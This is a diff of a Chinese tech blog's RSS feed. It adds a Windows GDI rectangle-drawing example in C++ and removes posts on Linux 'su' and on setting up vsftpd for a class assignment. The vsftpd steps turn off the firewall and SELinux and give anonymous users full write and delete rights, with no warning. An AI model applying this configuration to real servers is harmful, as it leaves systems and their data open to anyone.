+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;COLORREF &lt;span class=&#34;token function&#34;&gt;SetDCBrushColor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  HDC      hdc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;         &lt;span class=&#34;token comment&#34;&gt;// 设备上下文环境句柄。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  COLORREF color        &lt;span class=&#34;token comment&#34;&gt;//RGB 颜色&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;绘制图形&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绘制图形&#34;&gt;#&lt;/a&gt; 绘制图形&lt;/h1&gt;
+&lt;h2 id=&#34;实例代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实例代码&#34;&gt;#&lt;/a&gt; 实例代码&lt;/h2&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;iostream&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;Windows.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//1. 设备对象 就是你要把东西画在什么地方&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 这里使用的是桌面的句柄&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	HWND hwnd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;HWND&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//2.DC 设备上下文对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 把它看成一块内存，画在内存中，然后再打印到屏幕上&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 获取设备上下文对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	HDC hdc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;GetDC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hwnd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//3. 图形对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 获取默认画刷 DC_BRUSH 可以设置颜色&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	HBRUSH hbrush &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;HBRUSH&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;GetStockObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;DC_BRUSH&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//4. 关联&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;SelectObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hdc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; hbrush&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//5. 开始画矩形&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 设置画刷颜色&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;SetDCBrushColor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hdc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;RGB&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 画矩形&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;Rectangle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hdc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//6. 销毁对象 释放资源&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;DeleteObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hbrush&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;ReleaseDC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hwnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; hdc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaUJpbmFyeS9wLzk1ODAyNjguaHRtbA==&#34;&gt;https://www.cnblogs.com/iBinary/p/9580268.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://self-ferry.github.io/2021/06/19/Windows%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</guid>
             <title>Windows逆向工程入门指南</title>
@@ -14156,555 +14654,6 @@ step4: 上一步得到的该节的相对偏移 + 该节在内存中的偏移 (Vi
 &lt;h1 id=&#34;原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原因&#34;&gt;#&lt;/a&gt; 原因&lt;/h1&gt;
 &lt;p&gt;是由于节的 VirtualSize&amp;gt;SizeOfRawData, 则即使文件的内存对齐与文件对齐都相同，节在内存中对齐后的大小和在文件中对齐后的大小也会不同。进而偏移地址也就不同。&lt;br /&gt;
 而我对 RVA 和 FOA 转换错误的认为只要 内存对齐与文件对齐相等，则 RVA 一定等于 ROA。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://self-ferry.github.io/2021/04/25/C%E3%80%81C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
-            <title>C、C++学习笔记</title>
-            <link>https://self-ferry.github.io/2021/04/25/C%E3%80%81C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
-            <pubDate>Sun, 25 Apr 2021 16:49:55 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://self-ferry.github.io/2021/04/20/Linux%E4%B8%AD%E7%9A%84su%E4%B8%8Esu-%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
-            <title>Linux中的su与su -命令的区别</title>
-            <link>https://self-ferry.github.io/2021/04/20/Linux%E4%B8%AD%E7%9A%84su%E4%B8%8Esu-%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
-            <category term="Linux" scheme="https://self-ferry.github.io/categories/Linux/" />
-            <category term="Linux" scheme="https://self-ferry.github.io/tags/Linux/" />
-            <pubDate>Tue, 20 Apr 2021 22:26:01 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
-&lt;p&gt;详情见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5oYTk3LmNvbS80MDAxLmh0bWw=&#34;&gt; http://www.ha97.com/4001.html&lt;/span&gt;&lt;/p&gt;
-&lt;h2 id=&#34;区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#区别&#34;&gt;#&lt;/a&gt; 区别&lt;/h2&gt;
-&lt;p&gt;su 命令和 su - 命令最大的本质区别就是：前者只是切换了 root 身份，但 Shell 环境仍然是普通用户的 Shell；而后者连用户和 Shell 环境一起切换成 root 身份了。只有切换了 Shell 环境才不会出现 PATH 环境变量错误。su 切换成 root 用户以后，pwd 一下，发现工作目录仍然是普通用户的工作目录；而用 su - 命令切换以后，工作目录变成 root 的工作目录了。用 echo $PATH 命令看一下 su 和 su - 以后的环境变量有何不同。以此类推，要从当前用户切换到其它用户也一样，应该使用 su - 命令。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://self-ferry.github.io/2021/04/20/Linux%E9%85%8D%E7%BD%AEvsftp/</guid>
-            <title>Linux配置vsftp</title>
-            <link>https://self-ferry.github.io/2021/04/20/Linux%E9%85%8D%E7%BD%AEvsftp/</link>
-            <category term="Linux" scheme="https://self-ferry.github.io/categories/Linux/" />
-            <category term="CentOS7配置vsftp" scheme="https://self-ferry.github.io/tags/CentOS7%E9%85%8D%E7%BD%AEvsftp/" />
-            <pubDate>Tue, 20 Apr 2021 10:41:51 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
-&lt;p&gt;Linux 网络服务课的作业。虽然简单，但也让我踩了不少坑，记个笔记吧。&lt;br /&gt;
-作业的内容是可以匿名上传或删除文件就可。&lt;/p&gt;
-&lt;h1 id=&#34;正文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正文&#34;&gt;#&lt;/a&gt; 正文&lt;/h1&gt;
-&lt;p&gt;先换个 yum 的源，下载的快一点。&lt;br /&gt;
- &lt;code&gt;wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;换源前也可以先备份一下。&lt;br /&gt;
-这里的详细内容可以参考&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1ZGluYW5peWEvYXJ0aWNsZS9kZXRhaWxzLzEwNTc1ODczOQ==&#34;&gt; https://blog.csdn.net/wudinaniya/article/details/105758739&lt;/span&gt;&lt;/p&gt;
-&lt;h2 id=&#34;下载vsftp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载vsftp&#34;&gt;#&lt;/a&gt; 下载 vsftp&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;yum -y install vsftpd&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;查看是否安装成功&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看是否安装成功&#34;&gt;#&lt;/a&gt; 查看是否安装成功&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;rpm -qa|grep vsftpd&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;关闭一切墙策略selinux&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关闭一切墙策略selinux&#34;&gt;#&lt;/a&gt; 关闭一切墙 | 策略 | SELINUX&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;systemctl stop firewalld&lt;/code&gt; &lt;br /&gt;
- &lt;code&gt;iptables -F&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;关闭 SELINUX，有两种方法：&lt;br /&gt;
-临时关闭：&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# getenforce&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Enforcing&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# setenforce 0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# getenforce&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Permissive&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;永久关闭：&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# vim /etc/sysconfig/selinux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;SELINUX&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;enforcing 改为 &lt;span class=&#34;token assign-left variable&#34;&gt;SELINUX&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;disabled&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;重启服务 reboot&lt;/p&gt;
-&lt;h2 id=&#34;修改vsftpdconfig&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改vsftpdconfig&#34;&gt;#&lt;/a&gt; 修改 vsftpd.config&lt;/h2&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;修改配置文件 /etc/vsftpd.conf&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;anonymous_enable&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;YES  &lt;span class=&#34;token comment&#34;&gt;# 允许匿名访问&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;write_enable&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;YES  &lt;span class=&#34;token comment&#34;&gt;# 允许写文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;anon_upload_enable&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;YES  &lt;span class=&#34;token comment&#34;&gt;# 允许匿名用户上传文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;anon_mkdir_write_enable&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;YES  &lt;span class=&#34;token comment&#34;&gt;# 允许匿名用户创建目录和写权限&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;anon_other_write_enable&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;YES  &lt;span class=&#34;token comment&#34;&gt;# 允许匿名用户删除、重命名等其它权限  这个在配置文件里默认找不到&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;这里附上详细的vsftpconfig配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#这里附上详细的vsftpconfig配置&#34;&gt;#&lt;/a&gt; 这里附上详细的 vsftp.config 配置&lt;/h2&gt;
-&lt;p&gt;vsftpd 的配置文件在为 vsftpd.conf，一般在 /etc/vsftpd/ 目录下。&lt;/p&gt;
-&lt;table&gt;
-    &lt;tr&gt;
-        &lt;th&gt;属性&lt;/th&gt;
-        &lt;th&gt;属性值&lt;/th&gt;
-        &lt;th align=&#34;left&#34;&gt;含义&lt;/th&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;anonymous_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许匿名用户（anonymous）登录 &lt;code&gt;FTP&lt;/code&gt;，如果该设置被注释，则默认允许&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;local_enable&lt;/td&gt;
